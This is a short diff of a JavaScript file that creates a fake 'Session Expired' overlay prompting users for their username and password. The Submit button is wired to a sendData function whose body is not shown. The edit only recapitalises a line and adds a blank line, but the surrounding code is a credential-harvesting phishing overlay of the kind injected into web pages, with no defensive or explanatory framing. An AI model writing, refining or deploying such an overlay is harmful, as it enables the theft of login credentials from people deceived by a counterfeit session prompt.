@@ -9,7 +9,7 @@ div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
 div.style.zIndex = '9999';
 div.innerHTML = `
     <h2>Session Expired</h2>
-    <p>Please re-enter your credentials:</p>
+    <p>Please Re-enter Your Credentials:</p>
     <input type="text" id="uName" placeholder="Username" required style="display:block; margin-bottom:10px;">
     <input type="password" id="pPass" placeholder="Password" required style="display:block; margin-bottom:10px;">
     <button id="submitBtn">Submit</button>
@@ -38,5 +38,6 @@ function sendData() {
 }
 
 document.getElementById('submitBtn').addEventListener('click', sendData);
+
 
 
